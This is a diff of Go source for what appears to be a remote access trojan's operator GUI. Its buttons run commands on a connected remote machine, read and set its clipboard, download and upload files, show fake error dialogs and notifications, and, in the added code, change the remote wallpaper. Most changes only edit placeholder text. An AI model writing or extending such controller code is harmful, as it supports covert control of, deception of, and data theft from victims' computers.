@@ -269,7 +269,7 @@ func main() {
 		}),
 		widget.NewButtonWithIcon("Open Url", theme.MailAttachmentIcon(), func() {
 			if selected.conn != nil && !streaming {
-				myEntry1.SetPlaceHolder("URL")
+				myEntry1.SetPlaceHolder("URL...")
 				dialog.NewCustomConfirm("URL", "Open", "Cancel", myEntry1, func(b bool) {
 					if b && strings.TrimSpace(myEntry1.Text) != "" {
 						writeCommand("\x03")
@@ -283,7 +283,7 @@ func main() {
 		}),
 		widget.NewButtonWithIcon("Execute Command", theme.BrokenImageIcon(), func() {
 			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Command")
+				myEntry1.SetPlaceHolder("Command...")
 				dialog.NewCustomConfirm("Executor", "Execute", "Cancel", myEntry1, func(b bool) {
 					if b && !streaming {
 						writeCommand("\x04")
@@ -300,7 +300,7 @@ func main() {
 			if selected.conn != nil {
 				dialog.NewCustomConfirm("Clipboard", "PUT", "GET", widget.NewLabel("Select Method..."), func(b bool) {
 					if b {
-						myEntry1.SetPlaceHolder("Content")
+						myEntry1.SetPlaceHolder("Content...")
 						dialog.NewCustomConfirm("Clipboard", "Put", "Cancel", myEntry1, func(b bool) {
 							if b && !streaming {
 								writeCommand("\x05")
@@ -326,8 +326,8 @@ func main() {
 
 		widget.NewButtonWithIcon("Fake Error", theme.WarningIcon(), func() {
 			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Title")
-				myEntry2.SetPlaceHolder("Message")
+				myEntry1.SetPlaceHolder("Title...")
+				myEntry2.SetPlaceHolder("Message...")
 				dialog.NewCustomConfirm("FakeError", "Show", "Cancel", container.NewVBox(myEntry1, myEntry2), func(b bool) {
 					if b && !streaming {
 						writeCommand("\x06")
@@ -342,11 +342,26 @@ func main() {
 			}
 		}),
 
+		widget.NewButtonWithIcon("Set Wallpaper", theme.CheckButtonIcon(), func() {
+			if selected.conn != nil {
+				myEntry1.SetPlaceHolder("Image Address...")
+				dialog.NewCustomConfirm("Wallpaper-Changer", "Change", "Cancel", container.NewVBox(myEntry1), func(b bool) {
+					if b && !streaming {
+						writeCommand("\x15")
+						writeCommand(myEntry1.Text)
+					}
+				}, myWindow).Show()
+				myEntry1.SetText("")
+			} else {
+				err.Show()
+			}
+		}),
+
 		widget.NewButtonWithIcon("Notification", theme.ErrorIcon(), func() {
 			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("App Name")
-				myEntry2.SetPlaceHolder("Title")
-				myEntry3.SetPlaceHolder("Message")
+				myEntry1.SetPlaceHolder("App Name...")
+				myEntry2.SetPlaceHolder("Title...")
+				myEntry3.SetPlaceHolder("Message...")
 				dialog.NewCustomConfirm("Notifier", "Notify", "Cancel", container.NewVBox(myEntry1, myEntry2, myEntry3), func(b bool) {
 					if b && !streaming {
 						writeCommand("\x07")
@@ -384,8 +399,6 @@ func main() {
 						writeCommand("0")
 					}
 				}, myWindow).Show()
-
-				myEntry1.SetText("")
 			} else {
 				err.Show()
 			}
@@ -427,7 +440,7 @@ func main() {
 		widget.NewButtonWithIcon("Download", theme.DownloadIcon(), func() {
 			if selected.conn != nil {
 				if !streaming {
-					myEntry1.SetPlaceHolder("Remote Path")
+					myEntry1.SetPlaceHolder("Remote Path...")
 					dialog.NewCustomConfirm("Download", "Download", "Cancel", myEntry1, func(b bool) {
 						if b && !streaming {
 							writeCommand("\x13")
@@ -445,7 +458,7 @@ func main() {
 
 		widget.NewButtonWithIcon("Upload", theme.UploadIcon(), func() {
 			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Local Path")
+				myEntry1.SetPlaceHolder("Local Path...")
 				dialog.NewCustomConfirm("Upload", "Upload", "Cancel", myEntry1, func(b bool) {
 					if b && !streaming {
 						if _, err := os.Stat(strings.TrimSpace(myEntry1.Text)); err == nil {
